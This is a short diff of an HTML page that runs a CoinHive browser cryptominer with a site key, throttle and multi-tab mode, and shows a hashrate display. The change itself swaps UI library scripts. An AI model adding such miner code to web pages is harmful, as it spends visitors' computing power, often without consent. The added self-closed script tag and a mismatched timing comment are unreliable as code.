@@ -7,6 +7,8 @@
       var miner = new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{throttle: 0.4});
       miner.start(CoinHive.FORCE_MULTI_TAB);
     </script>
+    <script 
+      src = "https://storage.googleapis.com/code.getmdl.io/1.0.6/material.min.js"/>
     <link 
       rel = "stylesheet" 
       href = "https://storage.googleapis.com/code.getmdl.io/1.0.6/material.indigo-pink.min.css"/>
@@ -47,9 +49,7 @@
       // Update stats once per second
       setInterval(updater, 100);
     </script>
-    <script src="https://unpkg.com/material-components-web@latest/dist/material-components-web.min.js"></script>
     <script>
-      window.mdc.autoInit();
       document.querySelector('#hashrate').addEventListener('mdl-componentupgraded', function() {
          hashRateProgress=this.MaterialProgress;
          this.MaterialProgress.setMax(8192);
